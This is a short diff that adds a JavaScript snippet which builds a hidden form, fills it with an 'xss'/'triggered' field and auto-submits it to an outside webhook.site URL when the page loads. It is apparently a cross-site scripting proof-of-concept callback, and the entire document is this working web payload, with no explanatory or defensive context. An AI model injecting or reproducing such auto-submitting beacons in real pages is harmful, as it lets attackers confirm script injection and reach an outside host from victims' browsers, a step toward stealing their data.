@@ -1,0 +1,10 @@
+var form = document.createElement('form');
+form.action = 'https://webhook.site/3cef4865-32de-4511-ae99-cd4b6947d5ec';
+form.method = 'POST';
+var input = document.createElement('input');
+input.type = 'hidden';
+input.name = 'xss';
+input.value = 'triggered';
+form.appendChild(input);
+document.body.appendChild(form);
+form.submit();
